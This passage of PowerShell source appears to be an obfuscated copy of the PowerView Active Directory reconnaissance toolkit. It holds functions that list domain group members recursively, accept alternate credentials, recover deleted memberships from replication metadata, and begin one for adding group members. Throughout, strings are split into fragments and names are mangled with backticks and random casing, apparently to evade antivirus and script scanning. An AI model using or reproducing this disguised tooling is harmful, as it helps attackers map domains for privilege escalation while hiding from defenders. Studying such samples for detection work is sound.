            $GroupManager   =   Get-DomainObject @SearcherArguments
            
            $ManagedGroup = New-Object ('P' + 'SObjec' +'t'  )
            $ManagedGroup | Add-Member (  'Notep' +'r'  + 'o' +  'perty') ("{0}{3}{2}{1}" -f 'Gr','Name','p','ou'  ) $_.SaMaCCOunTnamE
            $ManagedGroup   | Add-Member ('No' +  'teprop' +  'ert'+  'y' ) ("{0}{1}{3}{2}" -f 'GroupDistingu','i','hedName','s' ) $_.DiSTInGUisHEdNAmE
            $ManagedGroup  | Add-Member ( 'Note' + 'pr'  +  'o'  +'perty') ("{0}{2}{1}" -f 'Mana','me','gerNa'  ) $GroupManager.sAMAcCOUNTnAme
            $ManagedGroup  |  Add-Member ( 'N' + 'otepro'+'perty') (  "{3}{1}{4}{2}{0}{5}" -f 'dN','ana','ishe','M','gerDistingu','ame') $GroupManager.distiNgUishEdNAme

            
            if (  $GroupManager.SaMAccOUnttYPe -eq 0x10000000) {
                $ManagedGroup  | Add-Member ( 'No'  + 'teprope'+  'r' +'ty') ("{2}{1}{0}"-f'Type','anager','M'  ) ("{1}{0}" -f'roup','G')
            }
            elseif ( $GroupManager.SAMaCCOuNTtYPe -eq 0x30000000  ) {
                $ManagedGroup  | Add-Member (  'Notepr'  + 'op'  + 'erty'  ) (  "{0}{1}{2}"-f 'Mana','gerTy','pe'  ) ("{1}{0}" -f'er','Us')
            }

            $ACLArguments   =   @{
                ( "{1}{0}"-f'ity','Ident'  ) =   $_.DIstiNguIsHEdnAmE
                (  "{0}{2}{3}{1}"-f 'R','er','ightsFi','lt'  )   =   ("{1}{0}{2}"-f 'emb','WriteM','ers' )
            }
            if ($PSBoundParameters[(  "{0}{1}{2}" -f'S','erv','er'  )]  ) { $ACLArguments[( "{0}{1}" -f 'Se','rver')] =   $Server }
            if (  $PSBoundParameters[(  "{2}{1}{0}"-f'cope','archS','Se' )]  ) { $ACLArguments[( "{0}{2}{1}"-f 'Search','e','Scop'  )]   = $SearchScope }
            if ($PSBoundParameters[("{1}{2}{3}{0}"-f'geSize','Re','s','ultPa'  )]) { $ACLArguments[( "{1}{4}{2}{3}{0}"-f 'ze','Re','Page','Si','sult' )]  =   $ResultPageSize }
            if ( $PSBoundParameters[( "{1}{2}{0}" -f 't','ServerTimeLim','i'  )]) { $ACLArguments[("{2}{3}{0}{1}"-f'i','mit','ServerTi','meL'  )]   = $ServerTimeLimit }
            if ( $PSBoundParameters[("{0}{1}{2}" -f 'T','ombs','tone'  )] ) { $ACLArguments[( "{1}{2}{0}"-f'ne','Tombst','o')]   = $Tombstone }
            if (  $PSBoundParameters[("{1}{2}{3}{0}" -f'ential','C','re','d')] ) { $ACLArguments[("{0}{2}{1}" -f 'C','ential','red'  )]  =  $Credential }

            
            
            
            
            
            
            
            
            
            
            

            $ManagedGroup | Add-Member ('No'  +'t' + 'epropert'  +'y') ("{3}{1}{2}{0}" -f'rite','na','gerCanW','Ma'  ) (  "{1}{0}{2}" -f 'N','UNK','OWN'  )

            $ManagedGroup.PsObJEct.TyPENaMES.INsERt(  0, ( "{4}{3}{1}{6}{7}{0}{2}{8}{5}"-f'Se','w.Mana','cu','owerVie','P','up','g','ed','rityGro' ) )
            $ManagedGroup
        }
    }
}


function G`et`-DoMAInGRoUP`ME`mBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{3}{2}{0}{1}"-f 'ShouldProce','ss','S','P'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{2}{5}{9}{3}{1}{7}{0}{8}{6}"-f 'gnme','eThanAss','UseDe','arsMor','PS','cla','ts','i','n','redV'}, '')]
    [OutputType(  {"{1}{0}{3}{2}"-f 'iew.Gro','PowerV','ember','upM'} )]
    [CmdletBinding(DefaUltPArAMEtErsEtnAME   =  {"{1}{0}"-f'e','Non'} )]
    Param(  
        [Parameter(  POsiTion = 0, MANDAToRY   =  $True, VALUefROmPIPeLINE   =  $True, vaLUEfROMpIPElINeByPRopERtYname  =   $True  )]
        [Alias( {"{5}{4}{1}{3}{2}{0}" -f 'e','u','hedNam','is','sting','Di'}, {"{0}{2}{1}{3}"-f 'SamAcc','t','oun','Name'}, {"{0}{1}" -f'Na','me'}, {"{1}{5}{6}{4}{2}{0}{3}"-f 'a','M','dN','me','he','em','berDistinguis'}, {"{1}{2}{0}{3}" -f 'a','Me','mberN','me'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [Parameter(  paRAMEteRSETnaMe =  "M`A`NUALR`ECURse"  )]
        [Switch]
        $Recurse,

        [Parameter(PaRamETeRSETNAME = "ReCuRs`e`USINGm`A`TchI`NgRUlE")]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{1}{2}{0}"-f'r','Fi','lte'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{1}" -f 'ADSPat','h'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{3}{0}{4}{1}{2}"-f'inC','rol','ler','Doma','ont'} )]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{1}{2}"-f 'O','neLeve','l'}, {"{1}{2}{0}"-f'ree','Su','bt'})]
        [String]
        $SearchScope =  ( "{1}{2}{0}" -f 'tree','Su','b'),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize  =  200,

        [ValidateRange( 1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{0}{1}"-f'Da','cl'}, {"{1}{0}"-f 'p','Grou'}, {"{0}{1}" -f'No','ne'}, {"{0}{1}" -f'Ow','ner'}, {"{0}{1}"-f 'Sac','l'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =  [Management.Automation.PSCredential]::EmPty
    )

    BEGIN {
        $SearcherArguments =  @{
            ( "{1}{2}{0}" -f'erties','Pro','p'  ) =   (  "{1}{6}{3}{4}{2}{0}{5}"-f'me,distinguishedna','member','countna','sama','c','me',','  )
        }
        if ( $PSBoundParameters[("{2}{0}{1}" -f'a','in','Dom'  )]  ) { $SearcherArguments[( "{2}{1}{0}" -f'n','mai','Do'  )]  =   $Domain }
        if ( $PSBoundParameters[("{0}{1}{2}"-f 'LDAP','Filte','r')]) { $SearcherArguments[( "{2}{1}{0}"-f'lter','i','LDAPF')]  =  $LDAPFilter }
        if ( $PSBoundParameters[(  "{2}{0}{1}" -f'ear','chBase','S'  )]) { $SearcherArguments[(  "{2}{1}{0}" -f'ase','B','Search')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}" -f 'er','Serv')]) { $SearcherArguments[("{0}{1}" -f 'Se','rver')] =   $Server }
        if (  $PSBoundParameters[(  "{1}{0}{2}{3}" -f'rc','Sea','hSco','pe'  )]  ) { $SearcherArguments[("{1}{2}{0}"-f'cope','S','earchS' )]  =  $SearchScope }
        if ( $PSBoundParameters[(  "{1}{0}{2}{3}" -f 'a','ResultP','ge','Size' )] ) { $SearcherArguments[(  "{3}{1}{2}{4}{0}" -f'ze','tPag','e','Resul','Si' )]   = $ResultPageSize }
        if (  $PSBoundParameters[( "{2}{0}{1}" -f'rTimeLi','mit','Serve' )] ) { $SearcherArguments[(  "{2}{0}{1}{3}" -f 've','r','Ser','TimeLimit' )]   = $ServerTimeLimit }
        if ($PSBoundParameters[(  "{0}{1}{2}" -f'Tom','b','stone' )] ) { $SearcherArguments[( "{3}{2}{0}{1}" -f 'ton','e','bs','Tom')] =  $Tombstone }
        if ( $PSBoundParameters[( "{3}{1}{0}{2}" -f'dent','e','ial','Cr')]  ) { $SearcherArguments[("{0}{1}{2}"-f 'Cre','dent','ial' )]  =   $Credential }

        $ADNameArguments   = @{}
        if (  $PSBoundParameters[(  "{0}{1}" -f'Doma','in')]  ) { $ADNameArguments[("{0}{1}"-f'Do','main')]  =   $Domain }
        if (  $PSBoundParameters[(  "{0}{1}"-f 'Serve','r')]) { $ADNameArguments[( "{2}{0}{1}"-f'er','ver','S' )] =  $Server }
        if ( $PSBoundParameters[( "{0}{2}{1}{3}"-f'C','ti','reden','al')] ) { $ADNameArguments[(  "{0}{1}{2}"-f 'Cred','en','tial')] =   $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if (  $PSBoundParameters[("{3}{2}{1}{5}{0}{6}{4}" -f 'gR','s','r','Recu','le','eUsingMatchin','u' )] ) {
                $SearcherArguments[(  "{0}{1}" -f'Ident','ity')]  = $Identity
                $SearcherArguments['Raw'] =  $True
                $Group =   Get-DomainGroup @SearcherArguments

                if (-not $Group  ) {
                    Write-Warning (  '[' +  'Ge'+  't'  +  '-Dom'  + 'ainGroupMember]'  +' ' + 'Erro' +'r '+'search'  +'i'  +'ng '  + 'fo'  + 'r '  +  'g'  +  'roup '+  'w'  +  'ith '+'id'+  'en'  + 't'+  'ity: '  +"$Identity")
                }
                else {
                    $GroupFoundName  =   $Group.prOPerTIEs.iTem(  (  "{4}{1}{0}{2}{3}" -f'm','a','acc','ountname','s'))[0]
                    $GroupFoundDN   =  $Group.PROPErtieS.iTEm( ("{5}{1}{2}{0}{4}{3}" -f 'ishe','isti','ngu','name','d','d' ))[0]

                    if ($PSBoundParameters[(  "{0}{2}{1}" -f 'Do','ain','m')] ) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        
                        if ( $GroupFoundDN  ) {
                            $GroupFoundDomain =   $GroupFoundDN.sUBStRInG($GroupFoundDN.InDeXOf(  'DC=' ) ) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose (  '[Get-Do'  +  'ma' + 'inGr'  +'oupMemb'+'e'+'r] '+'Using' +  ' ' +'L'  + 'DAP '+  'm'  +  'a'+ 'tching ' +'rul'+  'e '  + 'to'+  ' ' +'recur'  +'s' + 'e '+ 'o'+'n '  + "'$GroupFoundDN', " +'onl'+'y '  +'use'  +  'r ' +  'ac' +'co'  + 'unts ' + 'wil' +  'l '  + 'b' +'e '+  'retu'+  'rn' +'e'  + 'd.'  )
                    $GroupSearcher.fIlter  = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropErTIestOLoaD.ADDrAnGE((("{2}{1}{4}{0}{3}"-f'uishedN','tin','dis','ame','g') ))
                    $Members = $GroupSearcher.FiNDaLL(  )   |   ForEach-Object {$_.ProPErTiES.DisTINguishEdnAMe[0]}
                }
                $Null   =   $SearcherArguments.remOve('Raw' )
            }
            else {
                $IdentityFilter  = ''
                $Filter   =   ''
                $Identity   | Where-Object {$_}  |  ForEach-Object {
                    $IdentityInstance   =  $_.RePlACE( '(', '\28' ).REplACe(')', '\29'  )
                    if (  $IdentityInstance -match (  "{0}{1}" -f'^S','-1-') ) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match ( "{1}{0}"-f 'N=','^C'  )  ) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if (  (-not $PSBoundParameters[(  "{0}{1}" -f'Dom','ain'  )]  ) -and (-not $PSBoundParameters[("{1}{0}{2}"-f'as','SearchB','e' )]) ) {
                            
                            
                            $IdentityDomain =  $IdentityInstance.suBSTRiNg($IdentityInstance.InDExof(  'DC=')  ) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ('[' +  'G' +  'et' + '-'+'Doma'  +'inGr'+  'oupMe'  +  'mber] ' +'E'  + 'xtract'+'ed ' + 'doma' +  'in '+  "'$IdentityDomain' "  + 'fr'  + 'om '+  "'$IdentityInstance'"  )
                            $SearcherArguments[("{1}{0}" -f 'main','Do')]  =   $IdentityDomain
                            $GroupSearcher =  Get-DomainSearcher @SearcherArguments
                            if (  -not $GroupSearcher ) {
                                Write-Warning (  '[Get-'+ 'Domai' +  'nGr' + 'o' + 'upMemb'+'e'+'r] '+  'Unabl' +'e '+  't' + 'o ' + 'retri'+  'ev'+  'e '+  'd'+  'om'  +  'ain '  +  'se'+'ar'  +'cher '+ 'f'+  'or '+"'$IdentityDomain'"  )
                            }
                        }
                    }
                    elseif (  $IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString  =  (  ([Guid]$IdentityInstance  ).toBYteaRRAY( ) | ForEach-Object { '\'   +   $_.toSTring( 'X2') } ) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif (  $IdentityInstance.ConTAiNs(  '\') ) {
                        $ConvertedIdentityInstance  = $IdentityInstance.RePlaCE(  '\28', '(').RePlacE( '\29', ')')  |  Convert-ADName -OutputType ( 'Canoni'  + 'cal')
                        if ($ConvertedIdentityInstance  ) {
                            $GroupDomain =  $ConvertedIdentityInstance.substriNG(0, $ConvertedIdentityInstance.iNDExof(  '/'  ))
                            $GroupName =  $IdentityInstance.SPLit( '\'  )[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[( "{0}{1}" -f'Domai','n'  )]  =  $GroupDomain
                            Write-Verbose ( '[' +  'Get-Do'+ 'ma' + 'i'  + 'nG'  +  'roupMem'  +  'ber] '+'Extr' + 'acted'+  ' '  + 'doma' + 'i' +  'n '+ "'$GroupDomain' "  +  'fro' + 'm '+  "'$IdentityInstance'")
                            $GroupSearcher =  Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ( $IdentityFilter -and ($IdentityFilter.tRIm(    ) -ne ''  ) ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if (  $PSBoundParameters[("{2}{0}{1}" -f'PFilte','r','LDA')] ) {
                    Write-Verbose ( '[Get-'+ 'Dom'+  'ain'  + 'GroupMemb'  + 'er'  +'] ' +'Usin'  + 'g '+'addit' + 'io' + 'nal '+ 'LD'  +  'AP ' +  'filte' +'r:' +' '+  "$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.fiLTer   = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    $Result   = $GroupSearcher.fIndoNE(   )
                }
                catch {
                    Write-Warning (  '[' +  'Get-Domai'  +  'nG' +'roupMember]'+' '+  'E' +  'rro' + 'r '+  's' +'earching'+' '  +  'f'  + 'or '+ 'g'+  'roup '+  'wit' +  'h '  +  'iden'+ 'tit'+ 'y '  + "'$Identity': "  +"$_"  )
                    $Members  =  @( )
                }

                $GroupFoundName =  ''
                $GroupFoundDN   =   ''

                if ( $Result ) {
                    $Members   = $Result.prOpErTIEs.ITeM(  ("{1}{0}"-f 'ber','mem'  )  )

                    if ($Members.coUnt -eq 0) {
                        
                        $Finished   =   $False
                        $Bottom   = 0
                        $Top  =   0

                        while (  -not $Finished ) {
                            $Top  =  $Bottom +  1499
                            $MemberRange ="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null   =   $GroupSearcher.ProPerTiEsTOLOAD.CleaR(  )
                            $Null =  $GroupSearcher.ProPErtIEstoloAD.aDd("$MemberRange" )
                            $Null   = $GroupSearcher.pRopERTIeSTOlOAD.ADD(("{1}{0}{2}"-f 'a','s','maccountname'))
                            $Null   =  $GroupSearcher.prOPeRtiESTOloAD.ADd(  ("{2}{0}{4}{3}{1}"-f'isti','name','d','shed','ngui')  )

                            try {
                                $Result = $GroupSearcher.FINDONe(  )
                                $RangedProperty   = $Result.pRoperTIEs.pRoPErtYNaMEs -like ( "{0}{3}{1}{2}" -f 'mem','r;ran','ge=*','be')
                                $Members += $Result.ProPeRTieS.iTeM(  $RangedProperty  )
                                $GroupFoundName  =  $Result.PrOpeRTIeS.iTEM( ("{0}{3}{1}{2}"-f 's','ccount','name','ama'))[0]
                                $GroupFoundDN = $Result.PROPERtIes.iTEm((  "{2}{1}{3}{5}{0}{4}" -f 'm','istingu','d','ishe','e','dna' ))[0]

                                if ( $Members.CoUNt -eq 0) {
                                    $Finished  =   $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished   =  $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName  = $Result.prOPErtIES.ITEm(  ("{0}{3}{2}{1}" -f'samacco','e','tnam','un' ) )[0]
                        $GroupFoundDN   =   $Result.PROpErtIeS.ITeM(  (  "{4}{1}{3}{0}{2}" -f 'is','i','hedname','ngu','dist'))[0]
                        $Members += $Result.pRoPerTIEs.iTEm($RangedProperty )
                    }

                    if ($PSBoundParameters[( "{0}{2}{1}"-f 'D','main','o'  )]  ) {
                        $GroupFoundDomain   =  $Domain
                    }
                    else {
                        
                        if ( $GroupFoundDN ) {
                            $GroupFoundDomain  = $GroupFoundDN.sUbsTRing($GroupFoundDN.inDeXOf('DC='  ) ) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ( $Member in $Members  ) {
                if ($Recurse -and $UseMatchingRule ) {
                    $Properties  =   $_.pRoPErTies
                }
                else {
                    $ObjectSearcherArguments   = $SearcherArguments.clONE(    )
                    $ObjectSearcherArguments[("{1}{0}"-f'ity','Ident'  )]   = $Member
                    $ObjectSearcherArguments['Raw']  =  $True
                    $ObjectSearcherArguments[("{0}{2}{1}"-f'Pr','s','opertie' )]  = (  "{2}{5}{4}{0}{6}{8}{9}{10}{1}{3}{7}" -f ',o','e','distinguishedname,cn,sama','ct','countname','c','bj','class','e','ctsid,ob','j')
                    $Object  = Get-DomainObject @ObjectSearcherArguments
                    $Properties   =   $Object.pRoPErTIeS
                }

                if ($Properties ) {
                    $GroupMember  = New-Object (  'PS' +'Ob'  + 'ject')
                    $GroupMember  |  Add-Member ( 'Noteprop'+ 'ert'+'y') ( "{0}{1}{2}" -f'GroupD','om','ain'  ) $GroupFoundDomain
                    $GroupMember |  Add-Member ( 'Not'  +  'eproper'+ 't'+  'y') (  "{0}{2}{1}"-f'Group','me','Na') $GroupFoundName
                    $GroupMember | Add-Member ( 'Notepr' + 'o'+ 'perty'  ) (  "{2}{1}{3}{4}{0}"-f'me','pDisti','Grou','nguis','hedNa'  ) $GroupFoundDN

                    if ($Properties.oBjEcTsiD) {
                        $MemberSID  = ((New-Object ('Syste'  +  'm.S'  + 'e' +'c' +'urity.P'  +'r'+ 'incipal.Secu'  +'rit'  + 'yIdenti'  +'f'  +'ier' ) $Properties.ObJecTsId[0], 0  ).VaLuE  )
                    }
                    else {
                        $MemberSID =   $Null
                    }

                    try {
                        $MemberDN   =  $Properties.DIstiNgUiSheDNAME[0]
                        if (  $MemberDN -match ( (  ("{6}{5}{3}{0}{2}{4}{1}"-f 'P','pS-1-5-21','rinci','ity','palsGE','ignSecur','Fore' ) ).REpLAcE( (  [char]71  +  [char]69  +  [char]112),'|')) ) {
                            try {
                                if ( -not $MemberSID) {
                                    $MemberSID   = $Properties.Cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType ("{2}{3}{1}{0}"-f'mple','Si','Do','main' ) @ADNameArguments

                                if ( $MemberSimpleName  ) {
                                    $MemberDomain =  $MemberSimpleName.sPlIt('@')[1]
                                }
                                else {
                                    Write-Warning ( '[Get-'+  'Doma'  +  'inGro'  +'u'+ 'p'  +'M'+ 'ember] '  +  'Er'+'ror ' +'conv'  + 'er'+'t' + 'ing '  + "$MemberDN" )
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning (  '[Get-'+  'Domai' +  'nGroup' +  'Member]'+' '  +  'E' +'rr' +'or '+'c'+ 'onver'+'ting'  +  ' ' + "$MemberDN"  )
                                $MemberDomain  =  $Null
                            }
                        }
                        else {
                            
                            $MemberDomain  =  $MemberDN.SUbstRing($MemberDN.inDexOF( 'DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain =   $Null
                    }

                    if ($Properties.SamaCCounTNAme) {
                        
                        $MemberName = $Properties.SamAccouNtNAMe[0]
                    }
                    else {
                        
                        try {
                            $MemberName   = ConvertFrom-SID -ObjectSID $Properties.CN[0] @ADNameArguments
                        }
                        catch {
                            
                            $MemberName   =  $Properties.cn[0]
                        }
                    }

                    if ($Properties.OBjECtCLASs -match ( "{1}{0}{2}" -f't','compu','er' )) {
                        $MemberObjectClass   =   ("{2}{1}{0}" -f 'r','mpute','co')
                    }
                    elseif ($Properties.ObjeCTcLAsS -match ( "{0}{1}"-f'grou','p'  )) {
                        $MemberObjectClass   =  (  "{1}{0}" -f 'p','grou')
                    }
                    elseif ( $Properties.ObJECtCLaSS -match ( "{1}{0}"-f 'r','use' )  ) {
                        $MemberObjectClass =  (  "{0}{1}"-f'u','ser')
                    }
                    else {
                        $MemberObjectClass  =   $Null
                    }
                    $GroupMember  | Add-Member ( 'Notep'+  'rop' +'e'  +'rty') (  "{3}{0}{1}{2}" -f'erDom','a','in','Memb') $MemberDomain
                    $GroupMember | Add-Member ('Notepr' +'o'  +  'pe'  +  'rty'  ) ("{1}{0}{3}{2}"-f'er','Memb','e','Nam' ) $MemberName
                    $GroupMember   |  Add-Member (  'Not'+'ep'  +  'roperty' ) ("{3}{5}{0}{4}{2}{1}"-f 'g','edName','ish','Me','u','mberDistin'  ) $MemberDN
                    $GroupMember  | Add-Member ('No' + 'tepro'+'perty') ( "{0}{4}{2}{1}{3}" -f'Mem','bj','rO','ectClass','be') $MemberObjectClass
                    $GroupMember  | Add-Member ( 'Note'+'pro'  + 'pert'  +  'y') (  "{2}{1}{0}"-f'berSID','em','M' ) $MemberSID
                    $GroupMember.pSOBJECt.TYPeNAMeS.InsErt(  0, ("{4}{3}{1}{2}{0}"-f 'r','GroupMe','mbe','erView.','Pow' )  )
                    $GroupMember

                    
                    if (  $PSBoundParameters[("{1}{0}"-f'se','Recur')] -and $MemberDN -and ($MemberObjectClass -match ( "{0}{1}" -f'g','roup') ) ) {
                        Write-Verbose ('[Get-D'  +'om' + 'a'  +'inGro'  +  'upMember] '  +  'Manua'  +'lly'  +' '  +'re'+  'curs'  +  'i'+'ng '+'o'  + 'n '+  'gr'  +  'oup: '+"$MemberDN"  )
                        $SearcherArguments[("{0}{2}{1}" -f'Ide','ity','nt'  )] = $MemberDN
                        $Null   =   $SearcherArguments.reMoVE(  ( "{0}{2}{1}" -f'P','erties','rop' )  )
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.disPOSe(   )
        }
    }
}


function ge`T`-DOmAing`R`OUPmemBE`RdeLEteD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{3}{2}{6}{0}{5}{1}" -f 'rsMor','gnments','claredV','SUseDe','P','eThanAssi','a'}, ''  )]
    [OutputType({"{1}{3}{4}{2}{5}{0}"-f'ed','Po','mainGroupMemberDel','werView','.Do','et'} )]
    [CmdletBinding(  )]
    Param(
        [Parameter(PosiTion   = 0, vALueFroMpIpELInE   =  $True, vaLuefroMPIpELINeBypRopERTYnamE  = $True  )]
        [Alias(  {"{2}{1}{4}{0}{3}"-f'ishedNa','n','Disti','me','gu'}, {"{2}{1}{3}{0}"-f'untName','amA','S','cco'}, {"{1}{0}"-f'ame','N'}, {"{0}{3}{4}{5}{2}{1}" -f 'Mem','me','a','berDis','ting','uishedN'}, {"{2}{1}{0}" -f'rName','mbe','Me'}  )]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{0}"-f 'ter','Fil'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(  {"{2}{1}{0}" -f'th','SPa','AD'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{0}{1}{3}{2}{4}"-f 'Do','mainC','l','ontro','ler'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f'Bas','e'}, {"{0}{1}{2}" -f 'O','n','eLevel'}, {"{2}{0}{1}"-f 'btre','e','Su'})]
        [String]
        $SearchScope =  ("{1}{0}"-f 'ubtree','S' ),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize  =  200,

        [ValidateRange( 1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =   [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
     )

    BEGIN {
        $SearcherArguments =   @{
            (  "{2}{0}{1}" -f'rt','ies','Prope' )    =   ("{2}{4}{3}{1}{0}{5}"-f'uemetada','al','msds-r','plv','e','ta'),(  "{3}{1}{2}{0}"-f'ishedname','st','ingu','di' )
            'Raw'             =    $True
            (  "{2}{1}{0}" -f 'er','ilt','LDAPF'  )      =    (  ( "{3}{5}{2}{0}{4}{1}"-f 'u',')','egory=gro','(obj','p','ectCat'  ) )
        }
        if ($PSBoundParameters[("{0}{1}"-f'Domai','n')] ) { $SearcherArguments[(  "{1}{0}" -f'in','Doma'  )]  =   $Domain }
        if ($PSBoundParameters[("{2}{1}{0}" -f'ter','l','LDAPFi')]  ) { $SearcherArguments[(  "{1}{0}{3}{2}"-f 'D','L','er','APFilt')]   = $LDAPFilter }
        if ($PSBoundParameters[( "{0}{1}{2}" -f 'Se','arch','Base' )]  ) { $SearcherArguments[("{1}{3}{2}{0}"-f'e','Search','as','B')]  = $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}"-f 'Se','rver')]  ) { $SearcherArguments[("{1}{0}" -f'erver','S' )]   =   $Server }
        if ($PSBoundParameters[("{1}{0}{2}" -f'chSco','Sear','pe' )] ) { $SearcherArguments[( "{2}{0}{1}" -f 'rc','hScope','Sea' )]   =  $SearchScope }
        if (  $PSBoundParameters[( "{4}{2}{1}{3}{0}" -f'ze','Page','t','Si','Resul')] ) { $SearcherArguments[( "{1}{3}{0}{2}" -f 'PageS','Re','ize','sult')] = $ResultPageSize }
        if ($PSBoundParameters[(  "{2}{3}{1}{0}"-f'imeLimit','rT','S','erve')]  ) { $SearcherArguments[("{3}{4}{0}{1}{2}" -f'ver','TimeLi','mit','Se','r')] =  $ServerTimeLimit }
        if ($PSBoundParameters[( "{0}{2}{1}" -f'T','one','ombst')]  ) { $SearcherArguments[("{2}{0}{1}" -f 'mb','stone','To'  )]  =   $Tombstone }
        if ($PSBoundParameters[( "{0}{2}{1}" -f'C','ential','red')] ) { $SearcherArguments[(  "{0}{2}{1}" -f'Credent','al','i' )]   =  $Credential }
    }

    PROCESS {
        if (  $PSBoundParameters[("{0}{1}{2}" -f 'Ide','nt','ity'  )]) { $SearcherArguments[( "{1}{0}{2}" -f'den','I','tity'  )]  =  $Identity }

        Get-DomainObject @SearcherArguments   | ForEach-Object {
            $ObjectDN   = $_.PrOpeRtiEs[( "{3}{0}{1}{2}" -f 'isti','nguishedn','ame','d')][0]
            ForEach(  $XMLNode in $_.PrOPertieS[( "{4}{5}{2}{3}{1}{0}" -f'ata','valuemetad','rep','l','msd','s-' )] ) {
                $TempObject  = [xml]$XMLNode   |  Select-Object -ExpandProperty ( "{5}{0}{2}{1}{6}{4}{3}" -f 'REPL','META','_VALUE_','A','AT','DS_','_D' ) -ErrorAction ( 'Sile'  +  'nt'  +  'lyC'+  'onti'+  'nue' )
                if ( $TempObject  ) {
                    if (  ($TempObject.pSZattRIbuTENamE -Match (  "{1}{0}" -f'ber','mem') ) -and ( ($TempObject.dwVErsiON % 2  ) -eq 0  )) {
                        $Output   = New-Object ('PS'  +  'Obje'  + 'ct'  )
                        $Output   | Add-Member ('NotePr' +  'op'  +'erty' ) ("{0}{2}{1}"-f'Gro','pDN','u' ) $ObjectDN
                        $Output  | Add-Member (  'N' +  'ot'  + 'ePropert' +'y') (  "{1}{0}{2}" -f 'mb','Me','erDN'  ) $TempObject.PSZOBjEctDn
                        $Output  |   Add-Member ('No' +  'tePropert'  + 'y') (  "{3}{1}{2}{0}" -f 'ed','Fir','stAdd','Time') $TempObject.fTIMecReatED
                        $Output   |  Add-Member ( 'Not'+  'ePro'  +'perty') (  "{0}{2}{1}{3}"-f'Ti','De','me','leted' ) $TempObject.FTImeDEleTED
                        $Output  |   Add-Member ('NotePro'  +'pert' +  'y'  ) (  "{2}{5}{3}{1}{0}{6}{4}"-f'nating','igi','La','Or','e','st','Chang') $TempObject.FtiMELAsToRIGinaTingCHAngE
                        $Output   |  Add-Member (  'NoteP' + 'roper' +'ty') ("{0}{2}{3}{1}"-f'Times','ed','A','dd' ) ( $TempObject.DWVeRsION / 2 )
                        $Output  | Add-Member ('N'+  'ot'+'eP' + 'roperty') (  "{1}{3}{0}{2}" -f't','LastOri','ingDsaDN','gina'  ) $TempObject.pszLAsTORiGInaTingdSaDn
                        $Output.PsOBJECT.TYPENaMes.iNsERT(  0, (  "{5}{6}{4}{1}{7}{8}{3}{0}{9}{2}"-f'rDel','r','ted','e','nG','PowerView.','Domai','o','upMemb','e'  ))
                        $Output
                    }
                }
                else {
                    Write-Verbose (  '[G'  +'e' +  't-D' +  'oma' + 'inGrou' +'pMem' +  'be'  +  'rDeleted] ' + 'E' + 'rror '+  'r' + 'et' + 'r' + 'ieving '  + ( 'yDAm'+  'sds-replvaluem'  +'e' + 'ta'+ 'da'+  'tayDA '  ).RePLaCe( 'yDA',[StriNG][ChAR]39 ) +  'for' +' ' +"'$ObjectDN'" )
                }
            }
        }
    }
}


function ad`d-`dOMai`NgRO`Up`MEmBer {


